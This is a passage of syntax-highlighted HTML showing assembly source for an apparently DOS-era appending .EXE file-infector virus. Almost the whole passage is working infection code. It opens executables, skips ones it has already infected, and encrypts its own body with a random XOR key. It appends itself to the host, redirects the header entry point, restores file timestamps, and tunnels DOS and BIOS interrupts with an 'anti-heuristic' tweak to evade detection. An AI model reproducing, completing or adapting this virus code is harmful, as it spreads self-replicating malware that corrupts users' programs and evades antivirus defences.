</span><span class="sc5">No_Ext_Open</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; Infect-mode on?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">JMP_Exit_i21h</span><span class="sc0">           </span><span class="sc1">; Abort when not.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">               </span><span class="sc1">; Open file for r/w.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">No_Open_Error</span><span class="sc0">

</span><span class="sc5">JMP_Exit_i21h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Int_21h</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Daddy-K-tit 2 Gallyon van Vessem'</span><span class="sc0">

</span><span class="sc5">No_Open_Error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; BX = Handle.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle</span><span class="sc0">            </span><span class="sc1">; Filehandle?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Abort_Check</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read header.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Abort_Check</span><span class="sc0">             </span><span class="sc1">; If we can't read.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; &gt; 64k?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Over_64k</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">560</span><span class="sc0">                 </span><span class="sc1">; File too small?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Abort_Check</span><span class="sc0">
</span><span class="sc5">Over_64k</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">Mark</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">              </span><span class="sc1">; .EXE-file?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Abort_Check</span><span class="sc0">             </span><span class="sc1">; Exit when not.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">Checksum</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">   </span><span class="sc1">; Already infected?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Infect_File</span><span class="sc0">

</span><span class="sc5">Abort_Check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">

</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get filetime.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">           </span><span class="sc1">; Filelength MOD 16.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Padding</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">No_Padding</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write padding bytes.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Padding</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">
</span><span class="sc5">No_Padding</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Size host + padding.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Save old CS:IP.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Init_IP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Old_Entry</span><span class="sc0">
        </span><span class="sc6">MOVSW</span><span class="sc0">
        </span><span class="sc6">MOVSW</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Init_SP</span><span class="sc0">             </span><span class="sc1">; Save old SS:SP.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Old_Stack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Init_SS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Old_Stack</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Get random encryption-key.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">File_Key</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Copy virus to buffer</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; for encryption.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">End_Encrypted_File</span><span class="sc0">

</span><span class="sc5">Encrypt_Byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Encrypt ourself in buffer.</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encrypt_Byte</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Append virus to host.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Padding</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write original header</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; to end of hostfile.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeaderSize</span><span class="sc0">          </span><span class="sc1">; Calculate headersize.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Length host + padding.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Minus headersize.</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; *** Causes a bug with ARJ</span><span class="sc0">
                        </span><span class="sc1">; by small files. &gt; 512.</span><span class="sc0">
                        </span><span class="sc1">; Also with Invircible.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; In paragraphs.</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_CS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">; Store new CS.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_IP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Anti-heuristic.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_SS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Mem_Size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; Filelength in paragraphs.</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Mem_Size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">MinMem</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">                 </span><span class="sc1">; 512 byte-pages.</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; No rest?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">No_Round</span><span class="sc0">                </span><span class="sc1">; Then no round-off.</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Round off.</span><span class="sc0">
</span><span class="sc5">No_Round</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Byte_Pages</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">MOD512</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Checksum</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">   </span><span class="sc1">; Mark as infected.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_Begin_File</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write updated header.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">               </span><span class="sc1">; Restore filedate.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">           </span><span class="sc1">; Clear seconds.</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011110b</span><span class="sc0">           </span><span class="sc1">; 60 secs.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Close file.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

</span><span class="sc5">Exit_Int_21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Unhook_i24h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0">




    </span><span class="sc1">; Tunnelled disk interrupt 13h.</span><span class="sc0">
</span><span class="sc5">BiosInt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int13h</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

    </span><span class="sc1">; === Call the tunnelled DOS-interrupt. ===</span><span class="sc0">
</span><span class="sc5">DosInt</span><span class="sc4">:</span><span class="sc0">         
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int21h</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc1">;====( Get interrupt vector )================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     AL = Interrupt number to hook.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: CX:BX = Pointer to INT.</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc5">GetInt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">CLI</span><span class="sc0">                             </span><span class="sc1">; Get handler-address.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;====( Set interrupt vector )================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     AL = Interrupt number to hook.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returns:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  CX:BX = Pointer to handler.</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc5">SetInt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">



</span><span class="sc5">Old_Entry</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Carrier</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Entrypoint host.</span><span class="sc0">
</span><span class="sc5">Old_Stack</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Virus_End</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Stacksegment host.</span><span class="sc0">



    </span><span class="sc1">; === Finds the original BIOS &amp; DOS entrypoint. ===</span><span class="sc0">
</span><span class="sc5">Tracer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52h</span><span class="sc0">                 </span><span class="sc1">; List of lists.</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get 1st MCB.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Dos_Segment</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Save INT 01h.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int01h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Hook INT 01h.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NewInt01h</span><span class="sc0">
